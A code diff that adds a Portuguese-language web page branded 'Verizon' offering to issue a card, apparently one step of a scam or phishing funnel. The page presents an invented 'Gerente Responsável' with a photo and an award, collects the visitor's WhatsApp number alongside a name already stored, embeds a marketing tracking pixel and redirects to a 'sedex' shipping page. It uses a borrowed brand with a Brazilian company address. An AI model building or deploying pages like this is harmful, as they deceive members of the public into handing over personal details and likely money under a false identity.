@@ -1,0 +1,114 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verizon - Faça seu Cartão</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="assets/style.css">
+    
+<script src="js/latest.js" async="" defer=""></script>
+
+<script>
+  window.pixelId = "66bb763debbcebab27d68442";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+    
+</head><body>
+    <link rel="stylesheet" href="css/style.css">
+
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        .main-content {
+            flex: 1; /* Faz com que a main-content cresça para ocupar o espaço disponível */
+            max-width: 450px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 20px;
+        }
+
+    </style>
+
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">   
+    <div class="header">
+        <img style="width: 160px;" src="images/VfoPzxB.png" alt="Imagem Centralizada"> 
+    </div>
+
+    <div style="grid-area: content; padding: 0 1rem;">
+        <div style="margin-top: 40px;" class="main-content">
+        <!-- Seção de introdução ao gerente responsável -->
+            <div id="introducao-gerente" class="mb-3 text-center">
+                <h2>Ótimo, quase lá<span id="nomeUsuario"></span>!</h2>
+                <p>Antes de escolher uma forma de envio, conheça sua Gerente Responsável:</p>
+                
+                <div class="card p-3">
+                    <img src="images/e6rK3uX.jpeg" class="img-fluid rounded" alt="Foto da Gerente">
+                    <h5 class="mt-3">Gerente</h5>
+                    <h4 style="color: #ff2525;" class="text-pink">Júlia Amorim</h4>
+                    <p>Prêmio: melhor gerente 2023-2024</p>
+                </div>
+     
+                <p style="margin-top: 10px;">Após concluir o procedimento, a Júlia entrará em contato para garantir um atendimento humanizado sempre que você precisar.</p>
+    
+                <!-- Campo para inserir o WhatsApp -->
+                <div class="mb-3 text-start">
+                    <label for="whatsapp" class="form-label" style="font-size: 12px;color: gray;">Digite seu WhatsApp</label>
+                    <input type="text" class="form-control rounded-pill" id="whatsapp" placeholder="(00) 00000-0000">
+                </div>
+    
+                <button type="submit" id="continuarAg" class="btn btn-custom w-100 rounded-pill" onclick="enviarWhatsApp()">Continuar</button>
+            </div>
+        </div>
+    </div>    
+
+    <script>
+        // Função para carregar o nome do usuário do localStorage (se estiver disponível)
+        function carregarNomeUsuario() {
+            const nomeCompleto = localStorage.getItem('nome');
+            const primeiroNome = nomeCompleto ? nomeCompleto.split(' ')[0] : '';
+            document.getElementById('nomeUsuario').innerText = primeiroNome;
+        }
+
+        // Chamada da função para carregar o nome do usuário
+        carregarNomeUsuario();
+
+        // Função para enviar o WhatsApp e redirecionar
+        function enviarWhatsApp() {
+            const whatsapp = document.getElementById('whatsapp').value;
+            if (whatsapp) {
+                localStorage.setItem('whatsapp', whatsapp); // Salva o WhatsApp no localStorage
+
+                // Redireciona para a próxima página de confirmação (AJAX pode ser adicionado se necessário)
+                window.location.href = 'sedex/index.php';
+            } else {
+                alert('Por favor, insira seu número de WhatsApp.');
+            }
+        }
+    </script>
+
+    <div class="footer py-4" id="footerChg">
+        © 2024 Verizon S/A. CNPJ 68.694.585/0001-20. <br>
+        Av. Brig. Faria Lima, 1811, São Paulo/SP
+    </div>
+
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+
+
+</div></body></html>
